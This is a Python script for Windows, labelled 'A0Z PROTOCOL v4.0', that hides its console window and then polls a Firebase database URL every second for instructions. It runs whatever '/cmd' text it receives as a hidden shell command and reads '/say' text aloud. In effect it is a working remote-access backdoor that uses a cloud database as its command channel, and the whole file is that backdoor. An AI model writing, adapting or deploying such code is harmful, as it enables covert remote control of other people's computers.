import requests
import time
import os
import ctypes
import sys
import win32com.client
import subprocess

def hide_console():
    hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
    if hWnd:
        ctypes.WinDLL('user32').ShowWindow(hWnd, 0) # 0 تعني SW_HIDE

def speak(text):
    try:
        speaker = win32com.client.Dispatch("SAPI.SpVoice")
        speaker.Speak(text)
    except:
        pass

def execute_command(command):
    try:
        subprocess.Popen(command, shell=True, creationflags=0x08000000)
    except:
        pass

def start_gateway():
    # 1. إظهار واجهة البداية
    os.system('color 0a')
    os.system('cls')
    print("==================================================")
    print("   A0Z PROTOCOL v4.0 :: INITIALIZING...")
    print("==================================================")
    print("[*] STATUS: BOOTING CORE SYSTEM")
    print("[*] NODE: " + os.environ.get('COMPUTERNAME', 'UNKNOWN'))
    print("[*] SYSTEM WILL GO STEALTH IN 5 SECONDS...")
    print("--------------------------------------------------")
    
    # الانتظار لمدة 5 ثوانٍ قبل الاختفاء
    time.sleep(5)
    
    # 2. الاختفاء التام
    hide_console()
    
    # 3. بدء الاستماع للأوامر بصمت
    DB_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
    last_timestamp = 0

    while True:
        try:
            response = requests.get(DB_URL)
            data = response.json()
            if data:
                text = data.get('text', '')
                ts = data.get('timestamp', 0)
                
                if ts > last_timestamp:
                    if text.startswith("/say"):
                        speak(text.replace("/say", ""))
                    elif text.startswith("/cmd"):
                        execute_command(text.replace("/cmd", ""))
                    last_timestamp = ts
        except:
            pass
        time.sleep(1)

if __name__ == "__main__":
    start_gateway()
